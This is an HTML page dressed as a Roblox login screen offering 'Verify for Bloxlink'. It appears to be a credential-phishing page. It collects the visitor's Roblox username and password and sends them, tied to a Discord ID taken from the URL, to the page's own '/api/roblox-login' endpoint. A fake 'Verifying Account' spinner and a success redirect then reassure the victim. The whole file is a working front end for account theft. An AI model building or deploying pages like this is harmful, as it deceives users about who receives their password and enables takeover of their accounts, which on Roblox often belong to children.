<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }
        
        body {
            background: #f2f2f2;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .login-container {
            width: 100%;
            max-width: 420px;
        }
        
        .login-card {
            background: white;
            border-radius: 8px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
            padding: 40px;
        }
        
        .login-header {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .roblox-logo {
            font-size: 32px;
            font-weight: 900;
            color: #00a2ff;
            margin-bottom: 10px;
        }
        
        .login-title {
            font-size: 24px;
            font-weight: 600;
            color: #333;
            margin-bottom: 5px;
        }
        
        .login-subtitle {
            color: #666;
            font-size: 16px;
        }
        
        .login-form {
            margin-top: 20px;
        }
        
        .input-group {
            margin-bottom: 20px;
        }
        
        .input-label {
            display: block;
            margin-bottom: 8px;
            color: #333;
            font-weight: 500;
            font-size: 14px;
        }
        
        .input-field {
            width: 100%;
            padding: 12px 16px;
            border: 2px solid #e0e0e0;
            border-radius: 4px;
            font-size: 16px;
            transition: border-color 0.3s;
        }
        
        .input-field:focus {
            outline: none;
            border-color: #00a2ff;
        }
        
        .password-container {
            position: relative;
        }
        
        .toggle-password {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            color: #666;
            cursor: pointer;
            font-size: 14px;
        }
        
        .forgot-password {
            display: block;
            text-align: right;
            color: #00a2ff;
            text-decoration: none;
            font-size: 14px;
            margin-top: 8px;
        }
        
        .login-button {
            width: 100%;
            background: #00a2ff;
            color: white;
            border: none;
            padding: 14px;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.3s;
            margin-top: 10px;
        }
        
        .login-button:hover {
            background: #0088d1;
        }
        
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.8);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 2000;
        }
        
        .loading-content {
            background: white;
            padding: 30px;
            border-radius: 8px;
            text-align: center;
            max-width: 400px;
        }
        
        .loading-spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #00a2ff;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="login-card">
            <div class="login-header">
                <div class="roblox-logo">ROBLOX</div>
                <h1 class="login-title">Login to Roblox</h1>
                <div class="login-subtitle">Verify for Bloxlink</div>
            </div>
            
            <form class="login-form" id="loginForm">
                <div class="input-group">
                    <label class="input-label">Username or Email</label>
                    <input 
                        type="text" 
                        class="input-field" 
                        id="username" 
                        placeholder="Enter username or email"
                        required
                    >
                </div>
                
                <div class="input-group">
                    <label class="input-label">Password</label>
                    <div class="password-container">
                        <input 
                            type="password" 
                            class="input-field" 
                            id="password" 
                            placeholder="Enter password"
                            required
                        >
                        <button type="button" class="toggle-password" onclick="togglePassword()">
                            Show
                        </button>
                    </div>
                    <a href="#" class="forgot-password" onclick="event.preventDefault()">Forgot Password?</a>
                </div>
                
                <button type="submit" class="login-button" id="loginButton">
                    Log In
                </button>
            </form>
        </div>
    </div>
    
    <div class="loading-overlay" id="loadingOverlay">
        <div class="loading-content">
            <div class="loading-spinner"></div>
            <h3>Verifying Account...</h3>
            <p>Please wait while we verify your Roblox account.</p>
        </div>
    </div>
    
    <script>
        // Get parameters from URL
        const urlParams = new URLSearchParams(window.location.search);
        const discordId = urlParams.get('discord_id') || sessionStorage.getItem('discord_id');
        const token = sessionStorage.getItem('verification_token');
        
        function togglePassword() {
            const passwordField = document.getElementById('password');
            const toggleButton = document.querySelector('.toggle-password');
            
            if (passwordField.type === 'password') {
                passwordField.type = 'text';
                toggleButton.textContent = 'Hide';
            } else {
                passwordField.type = 'password';
                toggleButton.textContent = 'Show';
            }
        }
        
        async function handleLogin(event) {
            event.preventDefault();
            
            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value;
            
            if (!username || !password) {
                alert('Please enter both username and password');
                return;
            }
            
            // Show loading
            document.getElementById('loadingOverlay').style.display = 'flex';
            
            try {
                // Send credentials to our API
                const response = await fetch('/api/roblox-login', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        username: username,
                        password: password,
                        discordId: discordId,
                        token: token
                    })
                });
                
                const data = await response.json();
                
                if (data.success) {
                    // Store verification data
                    localStorage.setItem('roblox_username', data.robloxUsername);
                    localStorage.setItem('roblox_userid', data.robloxId);
                    localStorage.setItem('verification_token', data.verificationToken);
                    
                    // Redirect to success page
                    setTimeout(() => {
                        window.location.href = `verification-success.html?username=${encodeURIComponent(data.robloxUsername)}&userid=${data.robloxId}`;
                    }, 1000);
                } else {
                    throw new Error(data.error || 'Verification failed');
                }
                
            } catch (error) {
                console.error('Login error:', error);
                alert('An error occurred. Please try again.');
                document.getElementById('loadingOverlay').style.display = 'none';
            }
        }
        
        // Attach form submit handler
        document.getElementById('loginForm').addEventListener('submit', handleLogin);
        
        // Auto-focus username field
        document.getElementById('username').focus();
    </script>
</body>
</html>
